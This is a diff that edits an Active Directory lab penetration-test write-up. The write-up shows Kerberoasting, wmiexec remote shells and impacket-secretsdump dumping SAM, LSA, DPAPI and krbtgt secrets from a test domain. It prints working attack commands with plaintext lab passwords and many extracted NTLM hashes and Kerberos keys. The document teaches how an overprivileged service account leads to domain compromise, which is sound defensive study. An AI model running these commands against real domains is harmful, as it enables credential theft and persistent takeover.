@@ -47,7 +47,7 @@ Initial reconnaissance was performed to identify:
 * Valid domain user accounts
 * Potential attack paths (SPNs / service accounts)
 
-This phase revealed a high-value service account: sql_svc
+This phase revealed a high-value service account: **sql_svc**
 
 ---
 
@@ -147,37 +147,11 @@ This lab demonstrates how:
 C:\>whoami
 corp\sql_svc
 
-C:\>hostname
-EC2AMAZ-J75C1G4
-
-C:\>ipconfig
-Windows IP Configuration
-
-Ethernet adapter Ethernet 3:
-  Connection-specific DNS Suffix  . : us-east-2.compute.internal
-  IPv4 Address . . . . . . . . . . : 172.31.34.227
-  Subnet Mask . . . . . . . . . . : 255.255.240.0
-  Default Gateway . . . . . . . . : 172.31.32.1
-
 C:\>whoami /groups
-
-GROUP INFORMATION
-Group Name                           Type          SID                  Attributes
-================================================================================
-Everyone                             Well-known    S-1-1-0              Mandatory
-BUILTIN\Users                        Alias         S-1-5-32-545         Mandatory
-BUILTIN\Pre-Windows 2000 Compatible  Alias         S-1-5-32-554         Mandatory
-BUILTIN\Administrators               Alias         S-1-5-32-544         Mandatory group, Enabled by default
-NT AUTHORITY\NETWORK                 Well-known    S-1-5-2              Mandatory
-NT AUTHORITY\Authenticated Users     Well-known    S-1-5-11             Mandatory
-NT AUTHORITY\This Organization       Well-known    S-1-5-15             Mandatory
-CORP\Domain Admins                   Group         S-1-21-638...        Mandatory group, Enabled by default
-CORP\Domain RODC Password Replication Alias        S-1-21-538...        Mandatory group, Enabled by default
-NT AUTHORITY\NTLM Authentication     Well-known    S-1-5-64-10          Mandatory
-Mandatory Label\High Mandatory Level Label         S-1-16-12288
+CORP\Domain Admins                   Group         S-1-21-638...        Mandatory group, Enabled
 ```
 
-**Key Finding:** sql_svc is confirmed member of Domain Admins group - critical vulnerability identified.
+**Key Finding:** sql_svc confirmed as member of Domain Admins - critical vulnerability identified.
 
 ---
 
@@ -192,7 +166,6 @@ Default principal: jsmith@CORP.LOCAL
 
 Valid starting       Expires              Service principal
 06/28/26 12:58:59   06/28/26 22:58:59    krbtgt/CORP.LOCAL@CORP.LOCAL
-                                          renew until 06/29/26 12:58:52
 ```
 
 **Impact:** Valid Kerberos authentication established. Attacker can now interact with domain services.
@@ -204,14 +177,10 @@ Valid starting       Expires              Service principal
 
 ```
 (kali@kali)~$ impacket-GetUserSPNs corp.local/jsmith:Password123! -dc-ip 172.31.34.227
-Impacket v0.14.0.dev0 – Copyright Fortra, LLC and its affiliated companies
 
 ServicePrincipalName                 Name       MemberOf
 ===================================================================
 MSSQLSvc/sqlserver.corp.local:1433   sql_svc    CN=Domain Admins,CN=Users,DC=corp,DC=local
-
-PasswordLastSet: 2026-06-25 17:01:21.927319
-LastLogon: <never>
 ```
 
 **Critical Vulnerability:** Service account sql_svc identified with excessive privileges (Domain Admins membership). Direct path to full domain compromise.
@@ -223,7 +192,7 @@ LastLogon: <never>
 
 ```
 (kali@kali)~$ impacket-wmiexec 'corp.local/sql_svc:ComplexPassword123!@172.31.34.227'
-Impacket v0.14.0.dev0 – Copyright Fortra, LLC and its affiliated companies
+Impacket v0.14.0.dev0
 
 [*] SMBv3.0 dialect used
 [!] Launching semi-interactive shell – Careful what you execute
@@ -240,19 +209,11 @@ corp\sql_svc
 **Caption: Domain Admins group members including sql_svc verified**
 
 ```
-C:\>net user
-User accounts for \\
-
-Administrator  Guest          Jadmin
-jsmith         krbtgt         sql_svc
-The command completed with one or more errors.
-
 C:\>net group "Domain Admins" /domain
 Group name        Domain Admins
 Comment           Designated administrators of the domain
 
 Members
-
 Administrator     Jadmin         sql_svc
 
 The command completed successfully.
@@ -262,49 +223,34 @@ The command completed successfully.
 
 ---
 
-### Screenshot 6: Local SAM Hashes & LSA Secrets Extraction
-**Caption: Secretsdump beginning credential extraction from Domain Controller**
+### Screenshot 6: Credential Extraction Initiated
+**Caption: Secretsdump extracting NTLM hashes from Domain Controller**
 
 ```
 (kali@kali)~$ impacket-secretsdump 'corp.local/sql_svc:ComplexPassword123!@172.31.34.227'
-Impacket v0.14.0.dev0 – Copyright Fortra, LLC and its affiliated companies
+Impacket v0.14.0.dev0
 
 [*] Target system bootKey: 0x8dc1f3d7d34256a6b8db8d196d8aaaa8
-[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+[*] Dumping local SAM hashes
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
-Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-
-[*] Dumping cached domain logon information (domain\username:hash)
 [*] Dumping LSA Secrets
 [*] $MACHINE.ACC
-CORP\EC2AMAZ-J75C1G4$:aes256-cts-hmac-sha1-96:e6d4840236dfe9c9495e53f374b8788ad6486578a66f087713b182789937bf94
-
 [*] DPAPI_SYSTEM
-dpapi_machinekey:0xa89371de601f1118d0a0b23c5459a19e05759d43
-dpapi_userkey:0xbac64a442fdce825819fb3ebc4c39d47af9eef82
-
 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
 [*] Using the DRSUAPI method to get NTDS.DIT secrets
 ```
 
-**Result:** Credential extraction initiated. System secrets compromised.
+**Result:** Credential extraction in progress. All domain hashes now accessible.
 
 ---
 
-### Screenshot 7: Administrator & krbtgt Hash Compromise
+### Screenshot 7: krbtgt Hash Compromise
 **Caption: krbtgt hash compromise - Kerberos master key obtained**
 
 ```
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:1ccf2f40949c60dd8f9009662f78eacfc:::
-Administrator:aes256-cts-hmac-sha1-96:7be3a9421d7e686be7e2e592f431599bd1766afc28a08e9e56f7ef446c54347b
-Administrator:aes128-cts-hmac-sha1-96:09c042a2bfd0544b9a6218f8758ac271
-Administrator:des-cbc-md5:0dbafe2ac1895257
-
 krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0ac412149d85297951bbaf3c23a453e:::
 krbtgt:aes256-cts-hmac-sha1-96:a01e82913d40ec80fbbf0375ee087924da27aa77e0ea7cfe83473e68b20e24a8
 krbtgt:aes128-cts-hmac-sha1-96:39655377a50d1140853568aaf7b6b076
-krbtgt:des-cbc-md5:207abc621cb69eb3
 ```
 
 **CRITICAL FINDING:** krbtgt hash (Kerberos master key) extracted. This enables:
@@ -316,82 +262,44 @@ krbtgt:des-cbc-md5:207abc621cb69eb3
 ---
 
 ### Screenshot 8: All Domain User Credentials Extracted
-**Caption: Complete domain credential dump including all users and machine accounts**
+**Caption: Complete domain credential dump - all users and machine accounts compromised**
 
 ```
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:1ccf2f40949c60dd8f9009662f78eacfc:::
 corp.local\jsmith:1103:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
 corp.local\Jadmin:1104:aad3b435b51404eeaad3b435b51404ee:ccad9cd271d517d14d195b0ca33173a1e:::
 corp.local\sql_svc:1105:aad3b435b51404eeaad3b435b51404ee:5fdfca9e1a4c180e101b353233301f9b9:::
 EC2AMAZ-J75C1G4$:1000:aad3b435b51404eeaad3b435b51404ee:2d19d2dd270245e6be4111ff3b64b495:::
 
 [*] Kerberos keys grabbed
-Administrator:aes256-cts-hmac-sha1-96:2be3a9421d7e686be7e2e592f431599bd1766afc28a08e9e56f7ef446c54347b
-Administrator:aes128-cts-hmac-sha1-96:09c042a2bfd0544b9a6218f8758ac271
-Administrator:des-cbc-md5:0dbafe2ac1895257
-
-krbtgt:aes256-cts-hmac-sha1-96:a01e82913d40ec80fbbf0375ee087924da27aa77e0ea7cfe83473e68b20e24a8
-krbtgt:aes128-cts-hmac-sha1-96:39655377a50d1140853568aaf7b6b076
-krbtgt:des-cbc-md5:207abc621cb69eb3
-
-corp.local\jsmith:aes256-cts-hmac-sha1-96:059a139842dd8ef29f80e04576864e95b47c7b0820395976a78e8b23a728721229
-corp.local\Jadmin:aes256-cts-hmac-sha1-96:5b6044f2ba59871159d95900016de8feb24bc76f8bdf7e5192cd119f1478685
-corp.local\sql_svc:aes256-cts-hmac-sha1-96:8a6be1a6139bb3cd4634fbc1b7501ac4542c4f1d54694342258a97b4c09a9a3e
-EC2AMAZ-J75C1G4$:aes256-cts-hmac-sha1-96:e6d4840236dfe9c9495e53f374b8788ad6486578a66f087713b182789937bf94
+[*] Cleaning up...
 ```
 
 **Result:** All domain user credentials compromised - jsmith, Jadmin, sql_svc, and machine accounts.
 
 ---
 
-### Screenshot 9: Full Secretsdump Output - Complete Domain Compromise
-**Caption: Complete secretsdump extraction showing full domain compromise achieved**
+### Screenshot 9: Complete Domain Compromise Achieved
+**Caption: Complete secretsdump extraction showing full domain compromise with all encryption keys**
 
 ```
-(kali@kali)~$ impacket-secretsdump 'corp.local/sql_svc:ComplexPassword123!@172.31.34.227'
-Impacket v0.14.0.dev0 – Copyright Fortra, LLC and its affiliated companies
-
 [*] Target system bootKey: 0x8dc1f3d7d34256a6b8db8d196d8aaaa8
-[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
-Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-
-[*] Dumping cached domain logon information (domain\username:hash)
+[*] Dumping local SAM hashes
+[*] Dumping cached domain logon information
 [*] Dumping LSA Secrets
 [*] $MACHINE.ACC
-CORP\EC2AMAZ-J75C1G4$:aes256-cts-hmac-sha1-96:e6d4840236dfe9c9495e53f374b8788ad6486578a66f087713b182789937bf94
-
 [*] DPAPI_SYSTEM
-dpapi_machinekey:0xa89371de601f1118d0a0b23c5459a19e05759d43
-dpapi_userkey:0xbac64a442fdce825819fb3ebc4c39d47af9eef82
-
 [*] NL$KM
-0000  B6 96 C7 7E 17 8A 0C DD  8C 39 C2 0A A2 91 24 44
+[*] Dumping Domain Credentials
 
-[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
-[*] Using the DRSUAPI method to get NTDS.DIT secrets
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:1ccf2f40949c60dd8f9009662f78eacfc:::
-Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0ac412149d85297951bbaf3c23a453e:::
-corp.local\jsmith:1103:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
-corp.local\Jadmin:1104:aad3b435b51404eeaad3b435b51404ee:ccad9cd271d517d14d195b0ca33173a1e:::
-corp.local\sql_svc:1105:aad3b435b51404eeaad3b435b51404ee:5fdfca9e1a4c180e101b353233301f9b9:::
-EC2AMAZ-J75C1G4$:1000:aad3b435b51404eeaad3b435b51404ee:2d19d2dd270245e6be4111ff3b64b495:::
-
-[*] Kerberos keys grabbed
-Administrator:aes256-cts-hmac-sha1-96:2be3a9421d7e686be7e2e592f431599bd1766afc28a08e9e56f7ef446c54347b
-Administrator:aes128-cts-hmac-sha1-96:09c042a2bfd0544b9a6218f8758ac271
-Administrator:des-cbc-md5:0dbafe2ac1895257
-
+Administrator:aes256-cts-hmac-sha1-96:7be3a9421d7e686be7e2e592f431599bd1766afc28a08e9e56f7ef446c54347b
 krbtgt:aes256-cts-hmac-sha1-96:a01e82913d40ec80fbbf0375ee087924da27aa77e0ea7cfe83473e68b20e24a8
-krbtgt:aes128-cts-hmac-sha1-96:39655377a50d1140853568aaf7b6b076
-krbtgt:des-cbc-md5:207abc621cb69eb3
-
 corp.local\jsmith:aes256-cts-hmac-sha1-96:059a139842dd8ef29f80e04576864e95b47c7b0820395976a78e8b23a728721229
 corp.local\Jadmin:aes256-cts-hmac-sha1-96:5b6044f2ba59871159d95900016de8feb24bc76f8bdf7e5192cd119f1478685
 corp.local\sql_svc:aes256-cts-hmac-sha1-96:8a6be1a6139bb3cd4634fbc1b7501ac4542c4f1d54694342258a97b4c09a9a3e
 EC2AMAZ-J75C1G4$:aes256-cts-hmac-sha1-96:e6d4840236dfe9c9495e53f374b8788ad6486578a66f087713b182789937bf94
 
+[*] Kerberos keys grabbed
 [*] Cleaning up...
 ```
 
@@ -401,8 +309,21 @@ EC2AMAZ-J75C1G4$:aes256-cts-hmac-sha1-96:e6d4840236dfe9c9495e53f374b8788ad648657
 - ✅ krbtgt hash obtained (10-year Golden Ticket capability)
 - ✅ All Kerberos keys extracted (AES-256, AES-128, DES-CBC-MD5)
 - ✅ DPAPI keys compromised
-- ✅ LSA secrets dumped
 - ✅ Full persistent access achieved
+
+---
+
+## 💥 Executive Impact Summary
+
+This single misconfiguration (overprivileged service account) resulted in:
+
+* **Full Active Directory domain compromise** - Complete control over all domain resources
+* **Extraction of all user credentials** - Every domain user password hash obtained
+* **Compromise of Kerberos authentication system (krbtgt)** - Master key extracted
+* **Ability to forge authentication tickets (Golden Tickets)** - Create valid tickets for any user, any time
+* **Persistent, undetectable domain-level access** - 10-year ticket validity with no password required
+
+**Key Insight:** This demonstrates how a single compromised service account can lead to enterprise-wide takeover. The attack required no zero-days, no exploits—only misconfigurations that exist in real organizations today.
 
 ---
 
